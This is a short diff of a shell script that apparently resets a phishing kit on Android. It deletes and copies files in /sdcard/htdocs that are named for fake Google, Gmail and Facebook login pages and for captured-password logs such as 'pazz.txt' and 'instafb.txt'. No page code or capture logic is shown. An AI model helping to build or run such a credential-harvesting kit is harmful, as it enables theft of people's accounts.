@@ -12,7 +12,11 @@ rm /sdcard/htdocs/login.php
 rm /sdcard/htdocs/google.png
 rm /sdcard/htdocs/gmail.php
 rm /sdcard/htdocs/facebook.ttf
-rm /adcard/htdocs/mobile.png
+rm /sdcard/htdocs/mobile.png
+rm /sdcard/htdocs/pazz.txt
+rm /sdcard/htdocs/instapazz.txt
+rm /sdcard/htdocs/instafb.txt
+rm /sdcard/htdocs/idz.txt
 cd asset
 cd gcode
 cp google.ttf /sdcard/htdocs
